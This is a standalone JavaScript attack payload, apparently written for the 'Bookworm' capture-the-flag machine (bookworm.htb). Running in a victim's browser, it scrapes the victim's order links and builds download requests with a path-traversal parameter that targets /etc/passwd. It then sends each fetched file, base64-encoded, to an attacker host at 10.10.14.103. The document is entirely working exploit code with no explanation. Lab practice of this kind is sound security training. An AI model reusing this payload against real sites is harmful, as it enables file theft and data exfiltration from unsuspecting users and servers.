//

function getOrder(html_page) {
    const parser = new DOMParser();
    const htmlString = html_page;
    const doc = parser.parseFromString(htmlString, 'text/html');
    const orderLinks = doc.querySelectorAll('tbody a');
    const orderUrls = Array.from(orderLinks).map((link) => link.getAttribute('href'));
    return orderUrls;
}
function getDownload(html) {
    const container = document.createElement('div');
    container.innerHTML = html;
    const downloadLink = container.querySelector('a[href^="/download"]');
    const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../etc/passwd" : null;
    return downloadURL;
}
function arrayBufferToBase64( buffer ) {
    var binary = '';
    var bytes = new Uint8Array( buffer );
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode( bytes[ i ] );
    }
    return btoa( binary );
}
function sendrequest(url) {
    var attacker = "http://10.10.14.103/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + arrayBufferToBase64(await res.arrayBuffer()))
    });
}
async function getPdf(url) {
    const response = await fetch(url);
    const html = await response.text();
    const download = getDownload(html);
    if (download) {
        sendrequest(download);
    }
}
fetch("http://bookworm.htb/profile").then(async (res) => {
    const html = await res.text();
    const orders = getOrder(html);
    for (const path of orders) {
        const url = "http://bookworm.htb" + path;
        getPdf(url);
    }
});

//
